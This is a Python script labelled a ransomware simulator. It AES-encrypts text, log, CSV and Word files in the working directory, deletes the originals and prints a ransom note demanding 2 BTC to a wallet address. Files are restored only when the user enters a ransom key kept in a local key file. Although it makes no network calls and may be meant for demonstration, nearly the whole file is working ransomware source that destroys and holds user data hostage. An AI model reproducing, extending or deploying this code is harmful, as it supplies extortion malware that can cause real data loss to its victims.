import os
import json
import time
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from tqdm import tqdm
from colorama import Fore, Style, init

init(autoreset=True)

KEY_FILE = "ENCRYPTION_KEYS.secure"
ENCRYPTED_EXTENSION = ".locked"
DECRYPTED_EXTENSION = ""  
TARGET_EXTENSIONS = [".txt", ".md", ".log", ".csv", ".docx"]
BTC_WALLET_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

def log_event(event):
    with open("ransomware_log.txt", "a") as log_file:
        log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {event}\n")

def generate_key_iv():
    key = get_random_bytes(16)
    iv = get_random_bytes(16)
    return key, iv

def encrypt_file(filepath, key, iv):
    try:
        with open(filepath, 'rb') as f:
            plaintext = f.read()
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        
        encrypted_filepath = filepath + ENCRYPTED_EXTENSION
        with open(encrypted_filepath, 'wb') as f:
            f.write(ciphertext)
        
        os.remove(filepath)
        log_event(f"Encrypted: {filepath}")
        return encrypted_filepath
    except Exception as e:
        log_event(f"Error encrypting {filepath}: {e}")
        return None

def decrypt_file(filepath, key, iv):
    try:
        with open(filepath, 'rb') as f:
            ciphertext = f.read()
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        
        decrypted_filepath = filepath.replace(ENCRYPTED_EXTENSION, DECRYPTED_EXTENSION)
        with open(decrypted_filepath, 'wb') as f:
            f.write(plaintext)
        
        os.remove(filepath)
        log_event(f"Decrypted: {filepath}")
        return decrypted_filepath
    except Exception as e:
        log_event(f"Error decrypting {filepath}: {e}")
        return None

def is_target_file(filename):
    return any(filename.endswith(ext) for ext in TARGET_EXTENSIONS)

def get_files():
    return [f for f in os.listdir() if os.path.isfile(f) and f != __file__ and is_target_file(f)]

def encrypt_all_files():
    file_keys = {}
    files_to_encrypt = get_files()

    if not files_to_encrypt:
        print(f"{Fore.YELLOW}No files found that can be encrypted.")
        return None

    ransom_key = get_random_bytes(16).hex()

    sys.stdout = open(os.devnull, 'w')  # Suppress print statements during encryption

    print(f"{Fore.RED}{Style.BRIGHT}Encryption in Progress!")
    print(f"{Fore.RED}{Style.BRIGHT}Warning: Your files are being locked. All data is at risk!")

    for filename in tqdm(files_to_encrypt, desc=f"{Fore.RED}Locking Files", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} files encrypted"):
        key, iv = generate_key_iv()
        encrypted_filepath = encrypt_file(filename, key, iv)
        if encrypted_filepath:
            file_keys[encrypted_filepath] = (key.hex(), iv.hex())
    
    sys.stdout = sys.__stdout__  # Restore stdout
    with open(KEY_FILE, 'w') as keyfile:
        json.dump({"ransom_key": ransom_key, "keys": file_keys}, keyfile)
    
    log_event("Encryption completed.")
    print(f"{Fore.YELLOW}{Style.BRIGHT}All Files Locked!")
    return ransom_key

def files_already_encrypted():
    encrypted_files = [f for f in os.listdir() if f.endswith(ENCRYPTED_EXTENSION)]
    return bool(encrypted_files)

def load_keys():
    try:
        with open(KEY_FILE, 'r') as keyfile:
            data = json.load(keyfile)

        file_keys = {filepath: (bytes.fromhex(key), bytes.fromhex(iv)) 
                     for filepath, (key, iv) in data["keys"].items()}
        
        return file_keys, data["ransom_key"]
    except Exception as e:
        log_event(f"Error loading keys: {e}")
        return None, None

def decrypt_all_files():
    file_keys, _ = load_keys()
    
    if not file_keys:
        print(f"{Fore.RED}Decryption failed. Your files remain locked.")
        return
    
    sys.stdout = open(os.devnull, 'w')  # Suppress print statements during decryption

    print(f"{Fore.GREEN}{Style.BRIGHT}Decryption in Progress!")
    print(f"{Fore.GREEN}{Style.BRIGHT}Attempting to restore your files... This may take a moment!")

    for filename in tqdm(file_keys, desc=f"{Fore.GREEN}Restoring Files", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} files restored"):
        key, iv = file_keys[filename]
        decrypt_file(filename, key, iv)
    
    sys.stdout = sys.__stdout__  # Restore stdout
    log_event("Decryption completed.")
    os.remove(KEY_FILE)
    print(f"{Fore.YELLOW}{Style.BRIGHT}All Files Restored! Decryption Complete.")

def ransomware_simulator():
    print(f"{Fore.RED}{Style.BRIGHT}Warning: All Your Important Files Have Been Locked!")
    
    if files_already_encrypted():
        print(f"{Fore.RED}{Style.BRIGHT}It seems your files are already encrypted.")
        _, ransom_key = load_keys()
    else:
        ransom_key = encrypt_all_files()
    
    print(f"\n{Fore.RED}{Style.BRIGHT}Your Data Has Been Encrypted!")
    print(f"{Fore.YELLOW}{Style.BRIGHT}To unlock your files, transfer 2 BTC to the following wallet address:")
    print(f"{Fore.CYAN}{Style.BRIGHT}{BTC_WALLET_ADDRESS}")
    print(f"{Fore.RED}{Style.BRIGHT}Once the transaction is complete, enter the transaction ID below.")
    
    transaction_id = input(f"{Fore.GREEN}{Style.BRIGHT}Enter your transaction ID: ")
    print(f"{Fore.YELLOW}{Style.BRIGHT}Verifying transaction ID... Please wait...")
    time.sleep(5)

    if transaction_id == ransom_key:
        print(f"{Fore.GREEN}{Style.BRIGHT}Transaction verified successfully! Restoring your files...")
        decrypt_all_files()
    else:
        print(f"{Fore.RED}{Style.BRIGHT}Invalid transaction ID. Your files remain locked.")

    input(f"\n{Fore.CYAN}{Style.BRIGHT}Press any key to exit...")

if __name__ == "__main__":
    ransomware_simulator()
